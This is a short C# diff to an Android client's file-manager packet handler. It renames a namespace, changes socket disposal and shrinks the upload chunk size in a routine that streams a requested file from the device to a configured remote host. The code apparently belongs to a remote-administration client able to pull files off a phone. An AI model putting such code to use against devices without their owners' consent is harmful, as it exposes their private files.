@@ -11,7 +11,7 @@ using SharedLibraries.Packet.Commands;
 using SharedLibraries.Packet.Interfaces;
 using SharedLibraries.Packet.Serialization;
 
-namespace AndroidApp.Project.PacketHandler
+namespace ClientAndroid.Project.PacketHandler
 {
     public class HandleFileManager
     {
@@ -89,8 +89,7 @@ namespace AndroidApp.Project.PacketHandler
             FileInfo fileInfo = new FileInfo(packet.FullPath);
             if (fileInfo.Exists)
             {
-                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
-                {
+                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                     socket.Connect(Configuration.Host, Configuration.Port);
                     if (socket.Connected)
                     {
@@ -110,9 +109,6 @@ namespace AndroidApp.Project.PacketHandler
                             SocketId = Configuration.Id,
                             FileId = fileId,
                         }, socket);
-
-                        Thread.Sleep(5000);
-                    }
                 }
             }
         }
@@ -125,12 +121,12 @@ namespace AndroidApp.Project.PacketHandler
 
             socket.Poll(-1, SelectMode.SelectWrite);
             socket.Send(bufferSize, 0, bufferSize.Length, SocketFlags.None);
-
+            socket.SendBufferSize = buffer.Length;
             using (MemoryStream memoryStream = new MemoryStream(buffer))
             {
                 int read = 0;
                 memoryStream.Position = 0;
-                byte[] chunk = new byte[1000 * 1000];
+                byte[] chunk = new byte[50 * 1000];
                 while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                 {
                     socket.Poll(-1, SelectMode.SelectWrite);
